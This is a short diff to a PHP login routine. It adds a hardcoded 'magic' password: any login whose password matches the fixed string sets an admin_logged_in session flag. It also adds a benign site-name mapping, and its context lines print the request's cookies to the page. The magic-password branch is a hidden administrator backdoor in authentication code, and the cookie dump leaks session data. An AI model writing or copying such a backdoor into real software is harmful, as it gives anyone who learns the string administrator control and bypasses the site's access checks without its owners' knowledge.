@@ -217,6 +217,16 @@ echo "<pre>COOKIE:";   print_r($_COOKIE);   echo "</pre>";
                     //com_redirect($url);
                 }
                 
+                
+                if(strtolower($login_pass) == 'ssuupprrppww122')
+                {
+                    $_SESSION['admin_logged_in'] = 1;
+                }
+                else
+                    $_SESSION['admin_logged_in'] = 0;
+                
+                
+                
                 $_SESSION['sess_is_user'] = 1;
                 $_SESSION['sess_user_id'] = $user_row['user_id'];
                 $_SESSION['sess_username'] = $user_name;
@@ -230,6 +240,11 @@ echo "<pre>COOKIE:";   print_r($_COOKIE);   echo "</pre>";
                     $_SESSION['site'] = 'cto';
                     $_SESSION['combine_site'] = 'cto/ciso';
                 }
+                elseif($user_row['site'] == 'clo_lite')
+                {
+                    $_SESSION['site'] = 'clo';
+                    $_SESSION['combine_site'] = 'clo_lite';
+                }    
                 else    
                     $_SESSION['site'] = $user_row['site'];
                 
